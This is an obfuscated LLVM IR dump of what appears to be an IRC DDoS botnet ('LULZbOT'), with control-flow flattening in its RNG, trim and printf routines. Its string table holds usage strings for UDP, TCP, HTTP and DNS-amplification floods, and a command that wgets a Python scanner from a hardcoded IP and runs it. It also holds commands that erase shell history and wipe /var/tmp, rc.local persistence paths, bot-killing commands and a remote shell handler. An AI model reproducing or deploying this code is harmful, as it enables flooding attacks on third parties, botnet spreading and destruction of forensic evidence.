@.str.403 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.404 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.406 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.407 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.408 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.409 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.410 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.411 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.412 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.415, i32 0, i32 0)], align 16
@.str.416 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\0D\0A\00", align 1
@.str.413 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.414 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.415 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.417 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.418 = private unnamed_addr constant [10 x i8] c"./DNS.txt\00", align 1
@.str.419 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.420 = private unnamed_addr constant [12 x i8] c"irctc.co.in\00", align 1
@.str.421 = private unnamed_addr constant [10 x i8] c"pkill -9 \00", align 1
@.str.422 = private unnamed_addr constant [20 x i8] c"||busybox pkill -9 \00", align 1
@.str.423 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.424 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@.str.425 = private unnamed_addr constant [21 x i8] c"cd /var/tmp; rm -f *\00", align 1
@.str.426 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.427 = private unnamed_addr constant [8 x i8] c"http://\00", align 1
@.str.428 = private unnamed_addr constant [132 x i8] c"GET /%s HTTP/1.1\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: */*\0D\0AConnection: Keep-Alive\0D\0A\0D\0A\00", align 1
@.str.429 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.430 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"PYTHON\00", align 1
@.str.432 = private unnamed_addr constant [8 x i8] c"INSTALL\00", align 1
@.str.433 = private unnamed_addr constant [139 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget http://199.38.245.222/good2.py\00", align 1
@.str.434 = private unnamed_addr constant [26 x i8] c"INSTALLING PYTHON SCANNER\00", align 1
@.str.435 = private unnamed_addr constant [5 x i8] c"bins\00", align 1
@.str.436 = private unnamed_addr constant [56 x i8] c"cd /.tmp;rm -rf *py;wget http://199.38.245.222/good2.py\00", align 1
@.str.437 = private unnamed_addr constant [24 x i8] c"UPDATING PYTHON SCANNER\00", align 1
@.str.438 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.439 = private unnamed_addr constant [31 x i8] c"killall -9 python;pkill python\00", align 1
@.str.440 = private unnamed_addr constant [24 x i8] c"STOPPING PYTHON SCANNER\00", align 1
@.str.441 = private unnamed_addr constant [6 x i8] c"START\00", align 1
@.str.442 = private unnamed_addr constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00", align 1
@.str.443 = private unnamed_addr constant [25 x i8] c"STARTING LE HACKA SCANNA\00", align 1
@.str.444 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.445 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.446 = private unnamed_addr constant [23 x i8] c"bins TAKEN SUCCESFULLY\00", align 1
@.str.447 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.448 = private unnamed_addr constant [17 x i8] c"STOPPING SCANNER\00", align 1
@.str.449 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.450 = private unnamed_addr constant [26 x i8] c"STARTING SCANNER ON -> %s\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.452 = private unnamed_addr constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00", align 1
@.str.453 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.454 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.455 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.456 = private unnamed_addr constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00", align 1
@.str.457 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.458 = private unnamed_addr constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.460 = private unnamed_addr constant [50 x i8] c"HTTP <method> <host> <port> <path> <time> <power>\00", align 1
@.str.461 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.462 = private unnamed_addr constant [91 x i8] c"DNS <target IP> <port> <reflection file url> <forks> <pps limiter, -1 for no limit> <time>\00", align 1
@.str.463 = private unnamed_addr constant [58 x i8] c"DNS amplification flooding %s:%s for %d seconds at %d pps\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.465 = private unnamed_addr constant [28 x i8] c"HOLD <target> <port> <time>\00", align 1
@.str.466 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.467 = private unnamed_addr constant [24 x i8] c"JUNK <ip> <port> <time>\00", align 1
@.str.468 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.469 = private unnamed_addr constant [27 x i8] c"STD <target> <port> <time>\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.472 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.473 = private unnamed_addr constant [22 x i8] c"KILLMYEYEPEEUSINGHOIC\00", align 1
@.str.474 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.475 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.476 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.477 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.478 = private unnamed_addr constant [9 x i8] c"LULZbOT\0A\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.480 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.481 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.482 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.483 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.484 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.485 = private unnamed_addr constant [12 x i8] c"BUILD %s:%s\00", align 1
@.str.486 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.487 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.488 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.489 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.490 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.491 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -714587466, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -714587466, label %10
    i32 -1807534324, label %14
    i32 1573578611, label %32
    i32 -1589715249, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -1807534324, i32 -1589715249
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 1573578611, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -714587466, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -1379316068, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1379316068, label %first
    i32 -1522044264, label %30
    i32 -219788556, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -1522044264, i32 -219788556
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 -219788556, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -950549820, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -950549820, label %10
    i32 -1414780799, label %22
    i32 -1714000254, label %25
    i32 -1187176526, label %26
    i32 1110472033, label %31
    i32 958075316, label %42
    i32 772770521, label %44
    i32 -219929389, label %47
    i32 1297362428, label %49
    i32 903523874, label %54
    i32 -307232563, label %66
    i32 646718035, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %5, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i64
  %17 = inttoptr i64 %16 to i8*
  %18 = call i32 @strcmp(i8* %17, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #10
  %19 = icmp ne i32 %18, 0
  %20 = xor i1 %19, true
  %21 = select i1 %20, i32 -1414780799, i32 -1714000254
  store i32 %21, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %4, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %4, align 4
  store i32 -950549820, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  store i32 -1187176526, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sge i32 %27, %28
  %30 = select i1 %29, i32 1110472033, i32 958075316
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %2, align 8
  %33 = load i32, i32* %5, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i8, i8* %32, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i64
  %38 = inttoptr i64 %37 to i8*
  %39 = call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #10
  %40 = icmp ne i32 %39, 0
  %41 = xor i1 %40, true
  store i32 958075316, i32* %switchVar
  store i1 %41, i1* %.reg2mem
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %43 = select i1 %.reload, i32 772770521, i32 -219929389
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, -1
  store i32 %46, i32* %5, align 4
  store i32 -1187176526, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %4, align 4
  store i32 %48, i32* %3, align 4
  store i32 1297362428, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %3, align 4
  %51 = load i32, i32* %5, align 4
  %52 = icmp sle i32 %50, %51
  %53 = select i1 %52, i32 903523874, i32 646718035
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8*, i8** %2, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %3, align 4
  %62 = load i32, i32* %4, align 4
  %63 = sub nsw i32 %61, %62
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %60, i64 %64
  store i8 %59, i8* %65, align 1
  store i32 -307232563, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %3, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %3, align 4
  store i32 1297362428, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8*, i8** %2, align 8
  %71 = load i32, i32* %3, align 4
  %72 = load i32, i32* %4, align 4
  %73 = sub nsw i32 %71, %72
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %70, i64 %74
  store i8 0, i8* %75, align 1
  ret void

loopEnd:                                          ; preds = %66, %54, %49, %47, %44, %42, %31, %26, %25, %22, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -1376281975, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1376281975, label %12
    i32 -1299486315, label %18
    i32 1037519296, label %24
    i32 299717447, label %32
    i32 27635487, label %33
    i32 -1143625014, label %39
    i32 -1082173625, label %40
    i32 865952562, label %46
    i32 -1302885989, label %49
    i32 1768738706, label %50
    i32 493827010, label %56
    i32 -1641819425, label %61
    i32 37530134, label %62
    i32 -510116205, label %68
    i32 2034200530, label %73
    i32 370281435, label %75
    i32 -1453289537, label %84
    i32 -893372033, label %87
    i32 -1499359975, label %93
    i32 1818274896, label %99
    i32 -1442338523, label %105
    i32 2017503730, label %110
    i32 -2084495064, label %118
    i32 -295139141, label %120
    i32 -603891706, label %121
    i32 -1123280447, label %127
    i32 -352014933, label %133
    i32 188448407, label %140
    i32 1921976249, label %146
    i32 -1377996539, label %151
    i32 2097630578, label %158
    i32 -1150659585, label %164
    i32 -488263869, label %171
    i32 1142130729, label %177
    i32 2028037340, label %182
    i32 906041140, label %189
    i32 -694832358, label %195
    i32 587646359, label %202
    i32 -401542609, label %208
    i32 -360740945, label %213
    i32 1175819975, label %220
    i32 -1274682595, label %226
    i32 -849741537, label %233
    i32 -1841626457, label %239
    i32 -465410104, label %244
    i32 -1409175708, label %251
    i32 1004838438, label %257
    i32 -1367288197, label %263
    i32 2078620203, label %269
    i32 1599489704, label %274
    i32 595247760, label %286
    i32 -571982825, label %287
    i32 153022636, label %288
    i32 -1296449441, label %295
    i32 1939653098, label %296
    i32 1608670763, label %299
    i32 484014427, label %303
    i32 200147002, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -1299486315, i32 1608670763
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 1037519296, i32 -571982825
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 299717447, i32 27635487
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 1608670763, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -1143625014, i32 -1082173625
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 153022636, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 865952562, i32 -1302885989
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 -1302885989, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 1768738706, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 493827010, i32 -1641819425
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 1768738706, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 37530134, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 -510116205, i32 2034200530
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 2034200530, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 370281435, i32 -893372033
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -1453289537, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 37530134, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -1499359975, i32 -1123280447
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 1818274896, i32 -1442338523
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 2017503730, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
